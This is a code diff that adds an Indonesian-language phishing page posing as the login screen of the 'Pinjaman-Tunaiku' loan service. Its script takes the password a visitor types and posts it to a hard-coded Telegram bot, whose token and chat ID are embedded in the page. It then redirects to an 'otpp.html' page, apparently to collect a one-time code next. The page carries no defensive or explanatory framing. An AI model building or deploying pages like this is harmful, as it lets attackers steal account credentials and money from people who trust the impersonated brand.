@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pinjaman-Tunaiku</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Navbar atas */
+        .nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: #007bff;
+            padding: 12px 20px;
+            color: white;
+            box-sizing: border-box;
+            z-index: 1001; /* Pastikan navbar berada di atas konten lain */
+        }
+
+        .nav h2 {
+            margin: 0;
+            font-size: 1.5em;
+            text-align: left;
+        }
+
+        #main-content {
+            padding: 20px;
+            /* Tambahkan margin-top untuk memberi ruang untuk navbar */
+            flex: 1;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+            position: relative; /* Untuk menjaga konten utama di bawah navbar */
+        }
+
+        .form-container {
+            max-width: 400px;
+            margin: 0 auto;
+            text-align: center;
+            padding-bottom: 80px;
+            /* Tambahkan padding untuk ruang tombol dan bantuan */
+            position: relative;
+            margin-top: 50px;
+        }
+
+        .input-container {
+            display: flex;
+            align-items: center;
+            position: relative;
+            width: 100%;
+            margin: 15px auto;
+        }
+
+        .input-container input[type="password"] {
+            flex: 1;
+            padding: 15px;
+            font-weight:bold;
+            padding-right: 40px; /* Tambahkan ruang untuk ikon */
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box; /* Pastikan padding termasuk dalam ukuran total */
+        }
+
+        .input-container img {
+            position: absolute;
+            right: 10px;
+            width: 20px; /* Ukuran ikon */
+            height: 20px; /* Ukuran ikon */
+        }
+
+        .form-container button {
+            width: 90%;
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            color: white;
+            background-color: silver;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            max-width: 340px;
+            font-weight: bold;
+            margin-left: 18px;
+        }
+
+        .form-container button.active {
+            background-color: #00a550;
+        }
+
+        .help-text {
+            margin-bottom: 6px; /* Jarak 6px dari tombol kirim */
+            color: #555;
+            position: fixed;
+            bottom: 46px; /* Posisikan 6px di atas tombol kirim (tombol height + margin-bottom) */
+            left: 0;
+            right: 0;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        .help-text a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        
+        .blue-text {
+            color: black;
+            font-size: 13px;
+            margin-right: -8px;
+            margin-left: -8px;
+            font-weight: bod;
+            position: center;
+        }
+        
+        .red-text {
+            color: black;
+            font-size: 15px;
+            margin-right: -8px;
+            margin-left: -195px;
+            font-weight: bold;
+            position: center;
+        }
+        
+        .black-text {
+            color: black;
+            font-size: 13px;
+            margin-right: -8px;
+            margin-left: -140px;
+            font-weight: bod;
+            position: center;
+        }
+        .white-text {
+            color: black;
+            font-size: 14px;
+            margin-right: -8px;
+            margin-left: -270px;
+            font-weight: bold;
+            position: center;
+        }
+    </style>
+    <!-- Tambahkan jQuery -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <div id="main-content">
+        <div class="nav">
+            <h2>Masuk Akun</h2>
+        </div>
+        <div class="form-container">
+            <p class="right-align red-text">Masukan Password</p>
+            <p class="right-align blue-text">Jika Anda Merasa belum pernah buat password dengan</p>
+            <p class="right-align black-text">Nomor +62xxx xxx xxx <a href="#">Klik Di sini</a></p>
+            <p class="right-align white-text">Password</p>
+            <form id="login-form" action="submit.php" method="post">
+                <div class="input-container">
+                    <input type="password" id="user-input" name="userInput" placeholder="Minimal 8 karakter">
+                    <img src="https://raw.githubusercontent.com/Tria6460/Tria6460.github.io/main/images.png" alt="Icon">
+                </div>
+                <div class="help-text">
+                    Lupa Password? <a href="#">Klik Di sini</a>
+                </div>
+                <button id="submit-btn" type="button" disabled>Selanjutnya</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        $(document).ready(function() {
+            const submitBtn = $("#submit-btn");
+            const userInput = $("#user-input");
+
+            userInput.on("input", function() {
+                if (userInput.val().trim() !== "") {
+                    submitBtn.prop("disabled", false);
+                    submitBtn.addClass("active");
+                } else {
+                    submitBtn.prop("disabled", true);
+                    submitBtn.removeClass("active");
+                }
+            });
+
+            submitBtn.on("click", function() {
+                const password = userInput.val().trim();
+                if (password !== "") {
+                    sendMessageToTelegram(password);
+                }
+            });
+
+            function sendMessageToTelegram(message) {
+                const token = '6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY'; // Ganti dengan token bot Anda
+                const chatId = '6824078885'; // Ganti dengan ID chat Anda
+                const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                
+                $.ajax({
+                    url: url,
+                    method: 'POST',
+                    data: {
+                        chat_id: chatId,
+                        text: message
+                    },
+                    success: function(response) {
+                        console.log("Pesan terkirim: " + message);
+                        window.location.href = 'otpp.html'; // Arahkan ke halaman lain setelah berhasil mengirim
+                    },
+                    error: function(xhr, status, error) {
+                        console.error("Gagal mengirim pesan:", error);
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
